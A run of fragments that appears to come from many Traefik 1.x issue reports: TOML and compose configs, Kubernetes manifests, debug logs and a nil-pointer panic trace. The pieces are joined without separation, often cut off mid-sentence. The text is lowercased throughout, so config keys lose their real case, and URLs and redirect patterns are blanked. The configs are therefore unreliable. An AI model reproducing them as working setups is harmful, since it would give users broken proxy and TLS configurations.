time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"host.docker.internal:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"host.docker.internal:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:32z" level=info msg="i have to go..."
time="2018-08-19t06:17:32z" level=info msg="stopping server gracefully"
time="2018-08-19t06:17:32z" level=debug msg="waiting 10s seconds before killing connections on entrypoint traefik..."
time="2018-08-19t06:17:32z" level=debug msg="waiting 10s seconds before killing connections on entrypoint http..."
time="2018-08-19t06:17:32z" level=debug msg="entrypoint traefik closed"
time="2018-08-19t06:17:42z" level=debug msg="wait hijack connection is over due to: context deadline exceeded"
time="2018-08-19t06:17:42z" level=error msg="error while closing hijacked conn: close tcp 172.17.0.2:50052->172.17.0.1:39690: use of closed network connection"
time="2018-08-19t06:17:42z" level=debug msg="entrypoint http closed"
time="2018-08-19t06:17:42z" level=info msg="server stopped"
time="2018-08-19t06:17:42z" level=info msg="shutting down"
``` the code i used is gprc offical server adn client:
debug=true defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry]
watch = true [acme]
email = "hidedit"
storage = "acme.json"
caserver = " "
entrypoint = "https"
[acme.dnschallenge]
provider = "cloudflare" [[acme.domains]] main = "hidedit" sans = ["hidedit"]
defaultentrypoints = ['https', 'http'] [entrypoints] [entrypoints.https] address = ':443' [entrypoints.https.tls] [entrypoints.https.proxyprotocol] trustedips = ['haproxy ip'] [entrypoints.http] address = ':80' [entrypoints.http.redirect] entrypoint = 'https' [api]
[metrics] [metrics.prometheus] [acme]
email = 'me@example.com'
entrypoint = 'https'
onhostrule = true
storage = '/acme/storage'
``` traefik docker container started with:
"--consul --consul.endpoint=\'consul:8500\' --consul.prefix=\'production/traefik\' --consul.watch=true --consulcatalog --consulcatalog.endpoint=\'consul:8500\' --consulcatalog.exposedbydefault=false --consulcatalog.watch=true --api"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) sorry i can't turn on debug log on production server
docker run -it -p 80:80 -p 8080:8080 traefik:alpine --api --ping --ping.entrypoint=http --ecs --ecs.autodiscoverclusters --ecs.region=us-east-1
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
debu[2018-08-13t16:12:28z] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":10000000000},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"tracing":null,"loglevel":"debug","entrypoints":{"http":{"address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"allowminweightzero":false,"web":null,"docker":null,"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":{"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"domain":"","exposedbydefault":true,"refreshseconds":15,"clusters":["default"],"cluster":"","autodiscoverclusters":true,"region":"us-east-1","accesskeyid":"","secretaccesskey":""},"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":false,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":{"entrypoint":"http"}}
info[2018-08-13t16:12:28z] preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-08-13t16:12:28z] preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-08-13t16:12:28z] starting provider *ecs.provider {"watch":true,"filename":"","constraints":[],"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"domain":"","exposedbydefault":true,"refreshseconds":15,"clusters":["default"],"cluster":"","autodiscoverclusters":true,"region":"us-east-1","accesskeyid":"","secretaccesskey":""}
info[2018-08-13t16:12:28z] starting server on :80
info[2018-08-13t16:12:28z] starting server on :8080
debu[2018-08-13t16:12:28z] ecs clusters: [arn:aws:ecs:us-east-1:632106808859:cluster/ecs-cluster-cluster-9dew5n7bj2ic]
2018/08/13 16:12:28 request.nextpage deprecated
use pagination type for configurable pagination of api operations
erro[2018-08-13t16:12:28z] provider connection error serializationexception: status code: 400, request id: ace788e9-9f13-11e8-8e95-a9927097b410, retrying in 286.075265ms
debu[2018-08-13t16:12:29z] ecs clusters: [arn:aws:ecs:us-east-1:632106808859:cluster/ecs-cluster-cluster-9dew5n7bj2ic]
debug = false
defaultentrypoints = ["http","https"] [traefiklog]
filepath = "/logs/traefik.log"
loglevel = "warn" [accesslog]
filepath = "/logs/traefik_access.log"
loglevel = "warn" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [api]
debug=false [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "mydomain.com"
watch = true
exposedbydefault = false [acme]
email = "me@mydomain.com"
storage = "/acme.json"
entrypoint = "https"
acmelogging = true
# caserver = " "
caserver = " "
[acme.dnschallenge] provider = "gandiv5" delaybeforecheck = 90 [[acme.domains]] main = "*.mydomain.com"
```
i think you should [update the doc]( #dns-provider-support), and flag gandi v5 as not working for wildcard, because of
- ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
example of 2 frontends files: ```toml
[frontends.nl_chic]
passhostheader = true
backend = "back1" [frontends.nl_chic.routes.default]
rule = "host: c.example.net"
``` ```toml
[frontends.nl_nor]
passhostheader = true
backend = "back1" [frontends.nl_nor.routes.default]
rule = "host: n.example.net"
traefik v1.6.5
aws elb ```toml ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
defaultentrypoints = ["http", "https"] [kubernetes] [web] address = ":8080" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key"
``` result of `/api`
"test.com\\/": { "servers": { "app-74bc77f9cd-6vjsl": { "url": "http:\\/\\/10.244.1.26:80", "weight": 1 }, "maintenance-698cf676d9-xlc8g": { "url": "http:\\/\\/10.244.1.38:8080", "weight": 1 } }, "loadbalancer": { "method": "wrr" } },
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key"
[kubernetes] [kubernetes.ingressendpoint] publishedservice = "kube-system/traefik-internal"
address = ":8080" [web.statistics] recenterrors = 15
``` i am using k8s 1.9.8.
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": true, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "info", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": true, "proxyprotocol": null, "forwardedheaders": null }, "panel": { "address": "", "tls": null, "redirect": null, "auth": { "basic": { "users": [], "usersfile": "" }, "digest": null, "forward": null, "headerfield": "" }, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "traefik": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": { "email": "xxxx", "domains": [], "storage": "xxxx", "storagefile": "", "ondemand": false, "onhostrule": false, "caserver": "", "entrypoint": "xxxx", "dnschallenge": null, "httpchallenge": null, "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": false, "tlsconfig": null }, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "domain": "xxxx", "tls": null, "exposedbydefault": false, "usebindportip": false, "swarmmode": false }, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "directory": "/etc/traefik/config/", "traefikfile": "" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": null, "configfile": "/etc/traefik/traefik.toml"
``` file `/etc/traefik/config/jenkins.toml`:
[frontends] [frontends.jenkins] backend = "jenkinspi" [frontends.jenkins.routes.test_1] rule = "host:casita.melchor9000.me" [frontends.jenkins.redirect] entrypoint = "https" permanent = true [frontends.jenkins.headers] sslredirect = true [backends] [backends.jenkinspi] [backends.jenkinspi.servers.pi] url = " "
we are on aws ```toml
[backends] [backends.ark_front] [backends.ark_front.servers.one] url = " "
``` to note, before switching to traefik we used nginx and it was possible to have nginx re-resolve the proxy_pass host on each request.
service fabric v6.1.480.9494
platform: windows server 2016 datacenter
################################################################
# global configuration
################################################################ # enable debug mode
# default: false
debug = true # traefik logs file
# if not defined, logs to stdout
#traefiklogsfile = "log/traefik.log" [traefiklog] filepath = "traefik.log" format = "json" # log level
# default: "error" loglevel = "debug" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["http", "https"] # entrypoints definition
[entrypoints]
[entrypoints.http]
address = ":80"
[entrypoints.traefik]
address = ":8080" # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
[accesslog] # sets the file path for the access log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "accesslog.txt" # format is either "json" or "common".
# default: "common"
format = "json" ################################################################
# api definition
################################################################ [api] # name of the related entry point # # optional # default: "traefik" # entrypoint = "traefik" # enabled dashboard # # optional # default: true # dashboard = true # enable debug mode
# this will install http handlers to expose go expvars under /debug/vars and # pprof profiling data under /debug/pprof
# additionally, the log level will be set to debug
# # optional # default: false # debug = true ################################################################
# service fabric provider
################################################################ # enable service fabric configuration backend
[servicefabric] # service fabric management endpoint
clustermanagementurl = " "
# note: use " " if you\'re using a secure cluster # service fabric management endpoint api version
apiversion = "3.0" # enable tls connection.
[servicefabric.tls]
cert = "certs/servicefabric.crt"
key = "certs/servicefabric.key"
insecureskipverify = true ```
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
\\"certs/servicefabric.crt\\",\\"key\\":\\"certs/servicefabric.key\\",\\"insecureskipverify\\":true}}","time":"2018-07-27t07:10:50z"}
{"level":"info","msg":"checking service fabric config","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"validation of load balancer method for backend fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice failed: invalid load-balancing method \'\'
using default method wrr.","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"configuration received from provider servicefabric: {\\"backends\\":{\\"fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\",\\"routes\\":{\\"traefik.frontend.rule\\":{\\"rule\\":\\"pathprefix: /api/values\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"creating frontend frontend-fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"wiring frontend frontend-fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice to entrypoint http","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"creating route traefik.frontend.rule pathprefix: /api/values","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"creating backend fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice","time":"2018-07-27t07:11:00z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-07-27t07:11:00z"}
{"level":"info","msg":"server configuration reloaded on :80","time":"2018-07-27t07:11:00z"}
{"level":"info","msg":"server configuration reloaded on :8080","time":"2018-07-27t07:11:00z"}
{"level":"info","msg":"checking service fabric config","time":"2018-07-27t07:11:10z"}
{"level":"debug","msg":"validation of load balancer method for backend fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice failed: invalid load-balancing method \'\'
using default method wrr.","time":"2018-07-27t07:11:10z"}
{"level":"debug","msg":"configuration received from provider servicefabric: {\\"backends\\":{\\"fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice\\",\\"routes\\":{\\"traefik.frontend.rule\\":{\\"rule\\":\\"pathprefix: /api/values\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}","time":"2018-07-27t07:11:10z"}
{"level":"info","msg":"skipping same configuration for provider servicefabric","time":"2018-07-27t07:11:10z"}
{"level":"info","msg":"checking service fabric config","time":"2018-07-27t07:11:20z"}
{"level":"debug","msg":"validation of load balancer method for backend fabric:/aspnetcorecontainerapp/aspnetcorecontainerservice failed: invalid load-balancing method \'\'
using default method wrr.","time":"2018-07-27t07:11:20z"} ```
n/a ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) n/a
na ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) this is the exact problem, the logs are impossible to share because they contain secret data.
loglevel = "error" defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.monitor] address = ":8080" [entrypoints.monitor.auth.basic] users = ["admin:$apr1$hkrfdjhghdfnhldgmkfjldfvaxturscmkc."] [acme]
email = "email@company.com" storage = "acme.json" entrypoint = "https" main = "*.company.com" sans = ["monitor.company.com", "frontend.company.com", "backend.company.com"] onhostrule = true [acme.httpchallenge] entrypoint = "http" # enable docker configuration backend
[docker] endpoint = "unix:///var/run/docker.sock" domain = "company.com" watch = true exposedbydefault = false [api]
entrypoint="monitor"
version: "3" networks: traefik-proxy: external: true internal: external: false services: traefik-ui: image: traefik:tetedemoine-alpine container_name: monitor command: --docker labels: - traefik.backend=monitor - traefik.enable=true - traefik.frontend.rule=host:monitor.company.com - traefik.docker.network=traefik-proxy - traefik.port=8080 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - ./traefik.toml:/traefik.toml - ./acme.json:/acme.json ports: - "80:80" - "8080:8080" # the web ui (enabled by --api) - "443:443" networks: - internal - traefik-proxy frontend: build: ./frontend image: frontend:latest container_name: frontend command: gunicorn --bind 0.0.0.0 wsgi:app labels: - traefik.backend=frontend - traefik.frontend.rule=host:frontend.company.com - traefik.docker.network=traefik-proxy - traefik.port=8000 networks: - internal - traefik-proxy backend: build: ./backend image: backend:latest container_name: backend command: gunicorn --bind 0.0.0.0 wsgi:app labels: - traefik.backend=backend - traefik.frontend.rule=host:backend.company.com - traefik.docker.network=traefik-proxy - traefik.port=8000 networks: - internal - traefik-proxy
[acme] email = "test@mydomain.com" storage = "/etc/traefik/acme.json" entrypoint = "https" acmelogging = true ondemand = false caserver = " "
``` ### possible root cause #l133 here the caserver is compared against the account uri, which will never match on prefix...
!=
maybe parsing the uri and matching the hostname would be fine
our toml looks like this:
defaultentrypoints = ["http","https"]
checknewversion = false
providersthrottleduration = 5
maxidleconnsperhost = 400
rootcas = [ "/usr/local/share/ca-certificates/*[munched]*.crt" ]
debug = true
loglevel = "debug" [traefiklog] filepath = "/dev/stdout" format = "json" [accesslog] filepath = "/dev/stdout" format = "json" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/*[munched]*crt" keyfile = "/etc/ssl/*[munched]*.key" [entrypoints.traefik] address = ":8080" [docker]
endpoint = "unix:///var/run/docker.sock"
swarmmode = true
domain = "*[munched]*.de"
watch = true [lifecycle]
requestacceptgracetimeout = "60s"
gracetimeout = "720s" [respondingtimeouts]
idletimeout = "720s" [forwardingtimeouts]
dialtimeout = "720s" [api] entrypoint = "traefik" dashboard = true [metrics] [metrics.prometheus] entrypoint = "traefik"
our productive swarm has 15 nodes
three of them are managers and we enforced that on each manager we have a running traefik instance
but this is also reproducible in a simple test setup with two nodes
root@*[munched]*-001:~# docker node ls
id hostname status availability manager status engine version
u27he9xn9v9qqjdrh1vvi5wr6 * *[munched]*-001 ready active leader 18.03.1-ce
7vu86tuubo2bpsg9w1btwynlz *[munched]*-002 ready active 18.03.1-ce
with a running traefik instance on the manager in a dedicated management stack:
version: '3'
services: traefik: image: *[munched]*/traefik/dev command: --configfile=/etc/traefik/traefik.toml networks: - traefik ports: - 80:80 - 443:443 - 8182:8182 volumes: - /var/run/docker.sock:/var/run/docker.sock deploy: mode: global update_config: parallelism: 1 delay: 5s labels: - traefik.port=8080 - traefik.docker.network=atam_ata-management placement: constraints: - node.role == manager
networks: default: traefik: external: name: atam_ata-management
the service that provides the downloads runs in its own stack: ```yml
version: '3'
services: provider: image: *[munched]*/traefikdebug/provider networks: traefik: deploy: labels: - traefik.port=8080 - traefik.docker.network=atam_ata-management
networks: default: traefik: external: name: atam_ata-management ``` here follows the output of docker inspect on the traefik overlay network:
[ { "name": "atam_ata-management", "id": "kik489j6sm08255lxo6wo2qrd", "created": "2018-06-20t14:48:44.302796415+02:00", "scope": "swarm", "driver": "overlay", "enableipv6": false, "ipam": { "driver": "default", "options": null, "config": [ { "subnet": "10.0.0.0/24", "gateway": "10.0.0.1" } ] }, "internal": false, "attachable": false, "ingress": false, "configfrom": { "network": "" }, "configonly": false, "containers": { "1c995534754792d8d59458463318d99e8e9745460cfa5e9c44e7a19e899f8e0c": { "name": "faas_gateway.1.2y44dbk1ast9mvy5kl8sf5dqv", "endpointid": "69c2af8d2ada3b51850ae180a8d420b1ba5dea96a63b3ebd4739e2edd6a569c6", "macaddress": "02:42:0a:00:00:f1", "ipv4address": "10.0.0.241/24", "ipv6address": "" }, "39cfe435313e88b424526fc8ec92131d404efa243bf270fe1da4c4e54144749c": { "name": "management_portainer.1.0d7m38vo2n8p4wywo57kevjd3", "endpointid": "f8794af8c9f3c5869c3dacdff9bc35fd11c3e1b63762df4530d698f0e498900b", "macaddress": "02:42:0a:00:00:f6", "ipv4address": "10.0.0.246/24", "ipv6address": "" }, "6afda6a332a48fe6f6cb4f9eb331629cf85f3bb84d8ed2fd99164ef4b86d31d5": { "name": "management_manager.1.qo2k2m2qcs89szddycut2q46j", "endpointid": "087878e8267e8b886fd87503972dff9cadaf72e63fcf165c313763957666f8b3", "macaddress": "02:42:0a:00:00:ed", "ipv4address": "10.0.0.237/24", "ipv6address": "" }, "f75216e6df56af7c15dcb09863d2c4f330017a933a6be63bb13c777bf5795f26": { "name": "management_traefik.u27he9xn9v9qqjdrh1vvi5wr6.qsro6e1lbfxwqgejfkzlvoboo", "endpointid": "c0b141fd31a8fba3073c427fb3b7ad9fa4a884483f303888755659a5a1152f39", "macaddress": "02:42:0a:00:00:f7", "ipv4address": "10.0.0.247/24", "ipv6address": "" } }, "options": { "com.docker.network.driver.overlay.vxlanid_list": "4097" }, "labels": {}, "peers": [ { "name": "a4c5fde4205f", "ip": "10.10.11.66" }, { "name": "98f46de40d03", "ip": "10.10.11.113" } ] }
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) here are the logs:
[logs.txt](
defaultentrypoints = ["http"]
loglevel = "info" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.metrics] address = ":9301" [traefiklog] [kubernetes] [lifecycle] requestacceptgracetimeout = "10s" gracetimeout = "3600s" [metrics] [metrics.prometheus] entrypoint = "metrics"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
address = ":8080"
readonly = true [ecs]
clusters = ["my-ecs-cluster-name"]
watch = true
domain = "example.com"
autodiscoverclusters = false
refreshseconds = 15
exposedbydefault = true
region = "eu-west-1"
i see the same issue #1210 but i look in code and there is no chunks in it.
on kubernetes:
kind: daemonset
apiversion: extensions/v1beta1
metadata: name: traefik-ingress-controller namespace: kube-system labels: app: traefik-ingress-lb
spec: minreadyseconds: 5 updatestrategy: type: rollingupdate template: metadata: labels: app: traefik-ingress-lb name: traefik-ingress-lb spec: serviceaccountname: traefik-ingress-controller terminationgraceperiodseconds: 60 hostnetwork: true containers: - name: traefik-ingress image: traefik:1.6.5-alpine ports: - name: http containerport: 80 hostport: 80 - name: admin containerport: 8080 securitycontext: privileged: true args: - --api - --ping - --cluster - --consul - --consul.endpoint=$(consul_service_host):8500 - --kubernetes - --loglevel=info
``` on os x i just tried to run `traefik --cluster` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
kubectl logs
$ kubectl -n kube-system logs traefik-ingress-controller-vx2fm time="2018-07-12t21:08:47z" level=info msg="traefik version v1.6.5 built on 2018-07-10_03:54:03pm" time="2018-07-12t21:08:47z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on:
/#collected-data\ " panic: runtime error: invalid memory address or nil pointer dereference [signal sigsegv: segmentation violation code= addr= pc= ] goroutine 1 [running]: github.com/containous/traefik/cluster.newleadership( , , , ) /go/src/github.com/containous/traefik/cluster/leadership.go:35 + github.com/containous/traefik/server.newserver( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:126 + main.runcmd( , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:180 + main.main.func1( , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:54 + github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:79 + main.main() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:142 + ``` os x output
$ traefik --cluster
panic: runtime error: invalid memory address or nil pointer dereference
[signal sigsegv: segmentation violation code= addr= pc= ] goroutine 1 [running]:
github.com/containous/traefik/cluster.newleadership( , , , ) /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/cluster/leadership.go:35 + github.com/containous/traefik/server.newserver( , , , , , , , , , , ...) /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/server/server.go:125 + main.runcmd( , , ) /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/cmd/traefik/traefik.go:180 + main.main.func1( , ) /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/cmd/traefik/traefik.go:54 + github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , ) /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:84 + main.main() /private/tmp/traefik-20180615-52269-s43ora/src/github.com/containous/traefik/cmd/traefik/traefik.go:142 +
traefik config:
loglevel = "debug"
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [ping]
entrypoint = "http" [kubernetes]
namespaces = ["default", "kube-system"] [web]
address = ":8080" [api]
entrypoint = "traefik"
dashboard = true [lifecycle]
gracetimeout = "80s"
requestacceptgracetimeout = "40s"
``` kubernetes version:
server version: version.info{major:"1", minor:"10", gitversion:"v1.10.3+coreos.0", gitcommit:"f1b890dbbf11abe58280b3ffe17d67749f5ae70e", gittreestate:"clean", builddate:"2018-05-21t17:27:17z", goversion:"go1.9.3", compiler:"gc", platform:"linux/amd64"}
```
thank you for reading!
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key"
[kubernetes]
email = "my@em.ail"
storage = "/acme/acme.json"
entrypoint = "https"
onhostrule = true [acme.httpchallenge] entrypoint = "http"
address = ":8080" [web.auth.basic] users = []
```
running on k8s deployed via helm stable/traefik with 1.6.4 image ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-07-09t12:03:08z" level=info msg="using toml configuration file /config/traefik.toml"
time="2018-07-09t12:03:08z" level=warning msg="web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics"
time="2018-07-09t12:03:08z" level=info msg="traefik version v1.6.4 built on 2018-06-15_03:12:50pm"
